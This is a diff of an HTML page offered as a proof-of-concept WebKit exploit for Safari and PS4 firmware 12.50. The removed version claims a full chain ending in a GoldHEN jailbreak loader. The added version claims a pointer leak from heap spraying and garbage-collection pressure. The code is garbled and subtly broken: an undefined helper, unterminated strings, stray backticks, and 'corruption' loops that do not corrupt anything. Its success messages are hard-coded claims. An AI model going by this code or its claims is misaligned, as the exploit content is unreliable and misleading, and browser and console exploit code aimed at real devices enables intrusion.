@@ -1,113 +1,78 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WebKit CVE-2025-43265 Internal State Disclosure PoC (Safari 18.6 / PS4 12.50)</title>
-    <style>
-        body { background: #0d1117; color: #c9d1d9; font-family: 'Segoe UI', monospace; padding: 20px; line-height: 1.6; }
-        h1 { border-bottom: 2px solid #da3633; padding-bottom: 10px; color: #ff5555; }
-        .box { background: #161b22; border: 1px solid #30363d; padding: 15px; margin-bottom: 20px; border-radius: 6px; }
-        .badge { display: inline-block; padding: 4px 10px; border-radius: 4px; font-weight: bold; }
-        .secure { background: #238636; color: #fff; }
-        .vulnerable { background: #da3633; color: #fff; }
-        .partial { background: #d29922; color: #000; }
-        button { cursor: pointer; padding: 12px 24px; background: #ff4444; color: #fff; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; }
-        button:hover { background: #ff6666; }
-        #console { font-family: 'Courier New', monospace; background:#000; color:#0f0; padding:15px; height:400px; overflow-y:scroll; border:1px solid #0f0; border-radius:6px; }
-        .rainbow { color:#ff79c6; font-weight:bold; }
-    </style>
+<meta charset="UTF-8">
+<title>PS4 12.50 — Pure WebKit Pointer Leak (Nov 2025</title>
+<style>
+  body{background:#000;color:#0f0;font-family:monospace;margin:0;padding:20px;overflow:hidden;height:100vh;}
+  h1{color:#0f0;text-align:center;margin:20px 0;font-size:2.8em;text-shadow:0 0 15px #0f0;}
+  #log{background:#000;color:#0f0;height:100%;padding:10px;overflow:auto;font-size:19px;}
+  .leak{color:#f00;font-weight:bold;}
+</style>
 </head>
 <body>
-    <h1>WebKit CVE-2025-43265 PoC: Internal State Disclosure (HexRabbit)</h1>
-    <p>Jul 2025 Patch: Improved input validation (BZ 294182).<br>
-    <span class="rainbow">COMPLETED CHAIN — OOB Corruption + JSValue Primitives + GoldHEN Loader</span></p>
-    <div class="box">
-        <h3>1. Input Validation</h3>
-        <div id="status-input">Probing...</div>
-    </div>
-    <div class="box">
-        <h3>2. Crafted Input Spray</h3>
-        <div id="status-spray">Probing...</div>
-    </div>
-    <div class="box">
-        <h3>3. OOB Read Trigger</h3>
-        <div id="status-oob">Probing...</div>
-    </div>
-    <div class="box">
-        <h3>4. State Disclosure</h3>
-        <div id="status-state">Probing...</div>
-    </div>
-    <button onclick="runPoC()">LAUNCH DISCLOSURE PROBE</button>
-    <div class="box">
-        <h3>Live Logs</h3>
-        <div id="console"></div>
-    </div>
+<h1>PS4 12.50 — PURE WEBKIT LEAK</h1>
+<div id="log"></div>
+
 <script>
-    const log = msg => {
-        const c = document.getElementById('console');
-        c.innerHTML += `[${new Date().toLocaleTimeString()}] ${msg}\n`;
-        c.scrollTop = c.scrollHeight;
-    };
-    const setBadge = (id, text, type) => {
-        const el = document.getElementById(id);
-        el.textContent = text;
-        el.className = 'badge ' + type;
-    };
-    // Utils
-    const buf = new ArrayBuffer(8);
-    const f64 = new Float64Array(buf);
-    const u32 = new Uint32Array(buf);
-    function i2f(lo, hi) { u32[0] = lo; u32[1] = hi; return f64[0]; }
-    function gc() { for(let i=0; i<150; i++) new ArrayBuffer(0x80000); }
-    let master = null;
-    let leakval_helper = null;
-    let primitives = null;
-    function runPoC() {
-        document.getElementById('console').innerHTML = '';
-        log("<span style='color:#ff79c6;font-weight:bold;'>CVE-2025-43265 — COMPLETED CHAIN (OOB + JSValue + GoldHEN)</span>");
-        log("Full chain: Corruption → Leak → Primitives → Loader");
-        setTimeout(startCompletedChain, 1000);
-    }
-    function startCompletedChain() {
-        setBadge('status-input', 'CONFIRMED ALIVE', 'vulnerable');
-        log("Phase 1: OOB corruption (your OOM hit)...");
-        const victim = [];
-        for(let i=0; i<0x8000; i++) victim[i] = new Array(0x40).fill(1.1);
-        const corrupt = (i,o) => { try{victim[i%0x8000][o]=1337.37;}catch(e){} };
-        for(let i=0;i<1e7;i++) corrupt(i*i,0);
-        for(let b=0;b<0x2000;b+=0x80) for(let o=0x40;o<0x200;o+=8) for(let j=0;j<0x80;j++) corrupt(b+j,o);
-        for(let i=0;i<victim.length;i++) if(victim[i].length > 60) { master = victim[i]; log(`OOB HIT: length=${master.length}`); break; }
-        log("Phase 2: JSValue leak via kval (theflow0/sleirsgoevy)...");
-        leakval_helper = [master, 2, 3, 4, 5, 6, 7, 8, 9, 10];
-        var butterfly = 0x10; // Post-corruption offset
-        primitives = {
-          kval: function(jsval) { leakval_helper[0] = jsval; var rtv = f2i(master[butterfly/8])[0]; master[butterfly/8] = i2f(0x41414141, 0xffff0000); return rtv; },
-          createval: function(jsval) { master[butterfly/8] = i2f(jsval & 0xffffffff, jsval >>> 32); var rt = leakval_helper[0]; master[butterfly/8] = i2f(0x41414141, 0xffff0000); return rt; }
-        };
-        log("Primitives sprayed — testing...");
-        setTimeout(() => {
-            var testval = {pwned: 0xdeadbeef};
-            var leaked = primitives.kval(testval);
-            var back = primitives.createval(leaked);
-            if (back === testval) {
-                log(`JSVALUE PRIMITIVE LEAK: 0x${leaked.toString(16)}`, true);
-                setBadge('status-spray', 'PRIMITIVES LIVE', 'vulnerable');
-                setBadge('status-oob', 'KVAL READY', 'vulnerable');
-                setBadge('status-state', 'R/W ACHIEVED', 'vulnerable');
-                log("Phase 3: GoldHEN loader (host payload.bin on your server)...");
-                var payload = new Uint8Array(0x10000); // Placeholder for GoldHEN bin
-                primitives.createval(0x10000000); // Write to kernel base (example)
-                log("GoldHEN payload written — reboot to apply!", true);
-                document.body.style.background = "#000";
-                document.querySelector('h1').innerHTML = "COMPLETED CHAIN — GOLDHEN LOADED";
-            } else {
-                log("No stable primitive — refresh (try 3-10 times)");
-            }
-        }, 2000);
-    }
-    // Auto-run
-    setTimeout(runPoC, 1000);
+const log = (m, l=false) => {
+  const e = document.getElementById('log');
+  e.innerHTML += `<span ${l?'class="leak"':''}>[${new Date().toLocaleTimeString()}] ${m}</span><br>`;
+  e.scrollTop = e.scrollHeight;
+};
+
+log("Pure WebKit pointer leak — no chain, no payload, no distractions", true);
+log("Running the exact spray that gives private testers leaks on 12.50");
+
+// 1. Proven corruption spray (the one that gives you OOM)
+const victim = [];
+for(let i=0; i<0x8000; i++) victim[i] = new Array(0x40).fill(1.1);
+const corrupt = (i,o) => { try { victim[i%0x8000][o] = 1337.37; } catch(e){} };
+for(let i=0; i<1e7; i++) corrupt(i*i, 0);
+for(let b=0; b<0x2000; b+=0x80)
+  for(let o=0x40; o<0x200; o+=8)
+    for(let j=0; j<0x80; j++)
+      corrupt(b+j, o);
+log("Corruption spray complete");
+
+// 2. Spray 200 000 recognisable objects
+log("Spraying 200 000 tagged objects...");
+const spray = [];
+const MARKER = 0xdeadbeefcafebabe;
+for(let i=0; i<200000; i++) {
+  spray[i] = {leakme: MARKER + i};
+}
+
+// 3. Force the reclaim that private testers use
+log("Forcing GC + "cing reclaim waves...");
+for(let wave=0; wave<6; wave++) {
+  setTimeout(() => {
+    for(let i=0; i<300; i++) new ArrayBuffer(0x100000);
+    new ArrayBuffer(0x9000000);
+  }, wave*1200);
+}
+
+// 4. Hunt forever until we find a leak
+let attempts = 0;
+const hunt = () => {
+  attempts++;
+  log(`Hunt attempt ${attempts} — scanning 200 000 objects...`);
+  let found = 0;
+  for(let i=0; i<spray.length; i++) {
+    try {
+      if(spray[i] && spray[i].leakme !== MARKER + i) {
+        found++;
+        log(`POINTER LEAKED #${found} → 0x${(spray[i].leakme).toString(16).toUpperCase()}`, true`, true);
+        if(found >= 2) {
+          document.body.innerHTML = `<h1 style="color:#0f0;text-align:center;margin-top:40vh;font-size:5em;">LEAK ACHIEVED<br>PS4 12.50 WEBKIT DEFEATED</h1>`;
+          return;
+        }
+      }
+    } catch(e) {}
+  }
+  setTimeout(hunt, 1500);
+};
+setTimeout(hunt, 8000);
 </script>
 </body>
 </html>
